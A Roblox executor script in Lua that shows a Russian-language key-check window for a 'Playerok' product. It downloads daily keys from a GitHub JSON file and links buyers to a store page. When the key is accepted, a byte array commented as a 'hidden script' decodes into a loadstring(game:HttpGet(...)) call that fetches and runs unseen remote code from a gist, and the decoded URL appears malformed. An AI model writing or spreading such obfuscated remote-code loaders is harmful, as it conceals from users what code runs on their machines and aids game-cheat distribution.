local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

-- Удаляем старый GUI
local oldGui = CoreGui:FindFirstChild("PlayerokKeyGui")
if oldGui then oldGui:Destroy() end

-- Загрузка ключей с GitHub
local keysURL = "https://raw.githubusercontent.com/RobloxScriptKey/MilediKeys-/main/MILEDI-keys.json"
local success, response = pcall(function()
    return game:HttpGet(keysURL)
end)

local keys = {}
if success then
    keys = HttpService:JSONDecode(response)
end

local today = os.date("%Y-%m-%d")
local todayKeyTable = keys[today]

local validKey = nil
if todayKeyTable then
    validKey = ""
    for _, v in ipairs(todayKeyTable) do
        validKey = validKey .. string.char(v)
    end
end

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "PlayerokKeyGui"
gui.ResetOnSpawn = false
gui.Parent = CoreGui

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 400, 0, 260)
frame.Position = UDim2.new(0.5, 0, 0.4, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(120, 140, 255)
frame.BackgroundTransparency = 1
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)

local grad = Instance.new("UIGradient", frame)
grad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 140, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 220, 255))
}
grad.Rotation = 45

local logo = Instance.new("TextLabel", frame)
logo.Size = UDim2.new(0, 40, 0, 40)
logo.Position = UDim2.new(0, 10, 0, 10)
logo.BackgroundTransparency = 1
logo.Text = "P"
logo.Font = Enum.Font.GothamBlack
logo.TextSize = 36
logo.TextColor3 = Color3.fromRGB(200, 220, 255)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 60)
title.BackgroundTransparency = 1
title.Text = "🔐 Введите ключ от Playerok"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 22

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.8, 0, 0, 36)
box.Position = UDim2.new(0.1, 0, 0, 110)
box.PlaceholderText = "Вставьте ключ..."
box.Font = Enum.Font.Gotham
box.TextSize = 20
box.TextColor3 = Color3.fromRGB(50, 50, 50)
box.BackgroundColor3 = Color3.fromRGB(230, 230, 255)
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.8, 0, 0, 40)
button.Position = UDim2.new(0.1, 0, 0, 160)
button.BackgroundColor3 = Color3.fromRGB(160, 200, 255)
button.Font = Enum.Font.GothamBold
button.TextSize = 20
button.TextColor3 = Color3.fromRGB(30, 30, 30)
button.Text = "Проверить"
Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)

local getKeyButton = Instance.new("TextButton", frame)
getKeyButton.Size = UDim2.new(0.8, 0, 0, 40)
getKeyButton.Position = UDim2.new(0.1, 0, 0, 210)
getKeyButton.BackgroundColor3 = Color3.fromRGB(160, 200, 255)
getKeyButton.Font = Enum.Font.GothamBold
getKeyButton.TextSize = 20
getKeyButton.TextColor3 = Color3.fromRGB(30, 30, 30)
getKeyButton.Text = "Получить ключ"
Instance.new("UICorner", getKeyButton).CornerRadius = UDim.new(0, 12)

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, 0, 0, 20)
feedback.Position = UDim2.new(0, 0, 0, 145)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.TextColor3 = Color3.new(1, 1, 1)
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 18

local copyFeedback = Instance.new("TextLabel", frame)
copyFeedback.Size = UDim2.new(1, 0, 0, 20)
copyFeedback.Position = UDim2.new(0, 0, 0, 255)
copyFeedback.BackgroundTransparency = 1
copyFeedback.Text = ""
copyFeedback.TextColor3 = Color3.fromRGB(30, 200, 30)
copyFeedback.Font = Enum.Font.Gotham
copyFeedback.TextSize = 16

-- Плавное появление
TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()

-- Drag & Drop
local dragging, dragStart, startPos = false, nil, nil
local function update(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        update(input)
    end
end)

-- Hover-анимация
local function addHoverEffect(element, hoverColor, normalColor)
    element.MouseEnter:Connect(function()
        TweenService:Create(element, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            BackgroundColor3 = hoverColor,
            Size = UDim2.new(element.Size.X.Scale, element.Size.X.Offset + 10, element.Size.Y.Scale, element.Size.Y.Offset + 5)
        }):Play()
    end)
    element.MouseLeave:Connect(function()
        TweenService:Create(element, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            BackgroundColor3 = normalColor,
            Size = UDim2.new(element.Size.X.Scale, element.Size.X.Offset - 10, element.Size.Y.Scale, element.Size.Y.Offset - 5)
        }):Play()
    end)
end

addHoverEffect(button, Color3.fromRGB(180, 220, 255), Color3.fromRGB(160, 200, 255))
addHoverEffect(getKeyButton, Color3.fromRGB(180, 220, 255), Color3.fromRGB(160, 200, 255))
addHoverEffect(box, Color3.fromRGB(250, 250, 255), Color3.fromRGB(230, 230, 255))

-- Проверка ключа и запуск скрипта
button.MouseButton1Click:Connect(function()
    local input = box.Text:match("^%s*(.-)%s*$")
    if not validKey then
        feedback.Text = "⚠️ Ключ на сегодня не найден"
        feedback.TextColor3 = Color3.fromRGB(255, 170, 0)
    elseif input == validKey then
        feedback.Text = "✅ Ключ верный, загружаем..."
        feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
        wait(1)
        gui:Destroy()
        
        -- Скрытый скрипт через цифры
        local a={108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,47,85,67,84,45,104,117,98,47,53,98,49,49,100,49,48,51,56,54,102,49,98,56,99,101,48,56,102,101,98,56,48,51,56,54,49,101,48,98,55,57,47,114,97,119,47,98,50,57,49,55,98,51,57,56,100,52,98,48,99,99,56,48,102,98,50,97,99,97,55,51,97,51,49,51,55,98,97,52,57,52,101,98,99,102,48,40,41,34,41,41}
        local s=""
        for i=1,#a do s=s..string.char(a[i]) end
        loadstring(s)()
    else
        feedback.Text = "❌ Неверный ключ"
        feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
    end
end)

-- Получить ключ
getKeyButton.MouseButton1Click:Connect(function()
    local link = "https://playerok.com/profile/MILEDI-STORE/products"
    setclipboard(link)
    copyFeedback.Text = "Ссылка скопирована"
    delay(2, function() copyFeedback.Text = "" end)
end)

-- Закрытие по ESC
UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.Escape then
        gui:Destroy()
    end
end)
